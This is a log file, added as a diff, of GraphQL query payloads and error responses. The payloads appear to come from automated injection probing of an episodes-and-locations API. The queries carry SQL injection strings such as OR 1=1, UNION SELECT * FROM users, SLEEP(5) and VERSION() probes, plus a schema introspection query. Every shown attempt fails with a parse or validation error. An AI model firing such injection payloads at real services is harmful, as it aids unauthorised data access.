@@ -1,0 +1,361 @@
+------------------Payload:-------------------
+
+{
+  Episode(id: "ZZCSIFXQK3" OR 1=1) {
+    id
+    name
+    status
+    species
+    type
+    gender
+    image
+    created
+  }
+}
+
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected :, found Int \"1\"","locations":[{"line":3,"column":31}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+{
+  Episode(id: "ZZCSIFXQK3" -- comment) {
+    id
+    name
+    status
+    species
+    type
+    gender
+    image
+    created
+  }
+}
+
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Invalid number, expected digit but got: \"-\".","locations":[{"line":3,"column":29}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+{
+  Episode(id: "ZZCSIFXQK3") {
+    id
+    name
+    status
+    species
+    type
+    gender
+    image
+    created
+  }
+  Episode(id: "ZZCSIFXQK4") {
+    id
+    name
+    status
+    species
+    type
+    gender
+    image
+    created
+  } UNION SELECT * FROM episodes
+}
+
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Cannot parse the unexpected character \"*\".","locations":[{"line":22,"column":18}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+{
+  Episode(id: "ZZCSIFXQK3" OR (SELECT COUNT(*) FROM episodes WHERE id = 'ZZCSIFXQK4') > 0) {
+    id
+    name
+    status
+    species
+    type
+    gender
+    image
+    created
+  }
+}
+
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected :, found (","locations":[{"line":3,"column":31}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+{
+  Episode(id: "ZZCSIFXQK3" OR SLEEP(5)) {
+    id
+    name
+    status
+    species
+    type
+    gender
+    image
+    created
+  }
+}
+
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected :, found Name \"SLEEP\"","locations":[{"line":3,"column":31}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+{
+  Episode(id: "ZZCSIFXQK3" OR 1/0) {
+    id
+    name
+    status
+    species
+    type
+    gender
+    image
+    created
+  }
+}
+
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected :, found Int \"1\"","locations":[{"line":3,"column":31}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+{
+  Episode(id: "ZZCSIFXQK3" OR (SELECT VERSION()) != '') {
+    id
+    name
+    status
+    species
+    type
+    gender
+    image
+    created
+  }
+}
+
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected :, found (","locations":[{"line":3,"column":31}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+    {
+      episodesByIds(ids: ["TRUE OR id = 'admin'", "ZZCSIFXQK1"]) {
+        # ...
+      }
+    }
+    
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected Name, found }","locations":[{"line":5,"column":7}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+    {
+      episodesByIds(ids: ["--", "ZZCSIFXQK1"]) {
+        # ...
+      }
+    }
+    
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected Name, found }","locations":[{"line":5,"column":7}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+    {
+      episodesByIds(ids: ["1 UNION SELECT * FROM users", "ZZCSIFXQK1"]) {
+        # ...
+      }
+    }
+    
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected Name, found }","locations":[{"line":5,"column":7}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+    {
+      episodesByIds(ids: ["1 OR 1=1", "ZZCSIFXQK1"]) {
+        # ...
+      }
+    }
+    
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected Name, found }","locations":[{"line":5,"column":7}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+    {
+      episodesByIds(ids: ["SLEEP(10)", "ZZCSIFXQK1"]) {
+        # ...
+      }
+    }
+    
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected Name, found }","locations":[{"line":5,"column":7}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+    {
+      episodesByIds(ids: ["1 / 0", "ZZCSIFXQK1"]) {
+        # ...
+      }
+    }
+    
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected Name, found }","locations":[{"line":5,"column":7}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+    {
+      episodesByIds(ids: ["SCHEMA()", "ZZCSIFXQK1"]) {
+        # ...
+      }
+    }
+    
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected Name, found }","locations":[{"line":5,"column":7}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+{
+  episodesByIds(ids: ["1", "ZZCSIFXQK1"]) {
+    # ...
+  }
+}
+
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected Name, found }","locations":[{"line":5,"column":3}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+{
+  locations(where: { OR: [{ type: "Planet" }, { type: { _eq: null } }] }) {
+    id
+  }
+}
+
+------------------Response:-------------------
+{"errors":[{"message":"Unknown argument \"where\" on field \"locations\" of type \"Query\".","locations":[{"line":2,"column":13}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}},{"message":"Cannot query field \"id\" on type \"Locations\".","locations":[{"line":3,"column":5}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}
+------------------Payload:-------------------
+
+{
+  locations(where: { id: { _eq: "123" }, OR: [{ dimension: { _eq: null } }] }) {
+    id
+  }
+}
+
+------------------Response:-------------------
+{"errors":[{"message":"Unknown argument \"where\" on field \"locations\" of type \"Query\".","locations":[{"line":2,"column":13}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}},{"message":"Cannot query field \"id\" on type \"Locations\".","locations":[{"line":3,"column":5}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}
+------------------Payload:-------------------
+
+{
+  locations(where: { AND: [{ created: { _eq: "2022-01-01" } }, { type: { _eq: null } }] }) {
+    id
+  }
+}
+
+------------------Response:-------------------
+{"errors":[{"message":"Unknown argument \"where\" on field \"locations\" of type \"Query\".","locations":[{"line":2,"column":13}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}},{"message":"Cannot query field \"id\" on type \"Locations\".","locations":[{"line":3,"column":5}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}
+------------------Payload:-------------------
+
+{
+  locations(where: { AND: [{ created: { _eq: "2022-01-01" } }, { dimension: { _eq: "abc123" } }] }) {
+    id
+  }
+}
+
+------------------Response:-------------------
+{"errors":[{"message":"Unknown argument \"where\" on field \"locations\" of type \"Query\".","locations":[{"line":2,"column":13}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}},{"message":"Cannot query field \"id\" on type \"Locations\".","locations":[{"line":3,"column":5}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}
+------------------Payload:-------------------
+
+    {
+        locations(filter: {dimension: "1=1", name: "", type: ""}) {
+            info
+            results {
+                id
+                name
+                type
+                dimension
+                created
+            }
+        }
+    }
+    
+------------------Response:-------------------
+{"errors":[{"message":"Field \"info\" of type \"Info\" must have a selection of subfields. Did you mean \"info { ... }\"?","locations":[{"line":3,"column":5}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}
+------------------Payload:-------------------
+
+    {
+        locations(filter: {dimension: "", name: "DDNB2U7URT", type: ""}) {
+            info
+            results {
+                id
+                name
+                type
+                dimension
+                created
+            }
+        }
+    }
+    
+------------------Response:-------------------
+{"errors":[{"message":"Field \"info\" of type \"Info\" must have a selection of subfields. Did you mean \"info { ... }\"?","locations":[{"line":3,"column":5}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}
+------------------Payload:-------------------
+
+        {
+            locations(filter: {dimension: "YA8C73NGBP", name: "", type: ""} AND OR 1=1) {
+                info
+                results {
+                    id
+                    name
+                    type
+                    dimension
+                    created
+                }
+            }
+        }
+        
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected :, found Name \"OR\"","locations":[{"line":3,"column":81}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+    {
+        locations(filter: {dimension: "", name: "DDNB2U7URT", type: 5XZWSZPI76}) {
+            info
+            results {
+                id
+                name
+                type
+                dimension
+                created
+            }
+        }
+    }
+    
+------------------Response:-------------------
+{"errors":[{"message":"Syntax Error: Expected :, found }","locations":[{"line":3,"column":79}],"extensions":{"code":"GRAPHQL_PARSE_FAILED"}}]}
+
+------------------Payload:-------------------
+
+    {
+        __schema {
+            types {
+                name
+                kind
+                isDeprecated
+                fields(includeDeprecated: true) {
+                    name
+                    type {
+                        ... on ScalarType {
+                            description
+                        }
+                        ... on ObjectType {
+                            description
+                        }
+                    }
+                    isDeprecated
+                    deprecationReason
+                }
+            }
+        }
+    }
+    
+------------------Response:-------------------
+{"errors":[{"message":"Cannot query field \"isDeprecated\" on type \"__Type\".","locations":[{"line":6,"column":7}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}},{"message":"Unknown type \"ScalarType\".","locations":[{"line":10,"column":18}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}},{"message":"Unknown type \"ObjectType\".","locations":[{"line":13,"column":18}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}
